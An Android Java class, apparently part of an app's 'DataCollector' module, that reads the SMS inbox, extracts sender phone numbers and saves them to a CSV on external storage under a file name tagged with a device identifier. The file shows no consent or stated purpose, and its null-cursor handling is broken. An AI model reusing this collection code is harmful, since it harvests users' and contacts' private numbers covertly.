package com.media.app.DataCollector;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;


import com.media.app.Utils.constants;
import com.opencsv.CSVWriter;

import java.io.File;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import static com.media.app.Utils.logger.logg;
import static com.media.app.Utils.utility.imi;


/**
 * Created by prabeer.kochar on 19-07-2017.
 */

public class smsData {

    public void getSMS(Context context) {
        Uri mSmsQueryUri = Uri.parse("content://sms/inbox");
        List<String> messages = new ArrayList<String>();
        logg("GetSMS Collector");
        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(mSmsQueryUri, null, null, null, null);
            if (cursor == null) {
                logg("cursor is null. uri: " + mSmsQueryUri);

            }
            for (boolean hasData = cursor.moveToFirst(); hasData; hasData = cursor.moveToNext()) {
                final String body = cursor.getString(cursor.getColumnIndexOrThrow("address"));
               logg(body);
                messages.add(body);
            }
            Set<String> msg = new HashSet<String>(messages);
            long timi = System.currentTimeMillis();
            String sFileName = constants.SMS_HEAD+ Long.toString(timi)+"_"+imi(context)+".csv";
            try {
                File root = new File(Environment.getExternalStorageDirectory(), constants.DataFolder);
                if (!root.exists()) {
                    root.mkdirs();
                }
                File file = new File(root, sFileName);
                file.createNewFile();
                CSVWriter csvWrite = new CSVWriter(new java.io.FileWriter(file,true));
                String[] colname= {"numbers"};
                csvWrite.writeNext(colname);
                for (String s : msg) {
                    //logg(s);
                    String data[] = {s};
                    csvWrite.writeNext(data);
                }
                csvWrite.flush();
                csvWrite.close();

            }catch (Exception e){
                e.printStackTrace();
            }
        } catch (Exception e) {
            logg( e.getMessage());
        } finally {
            cursor.close();
        }
    }
}
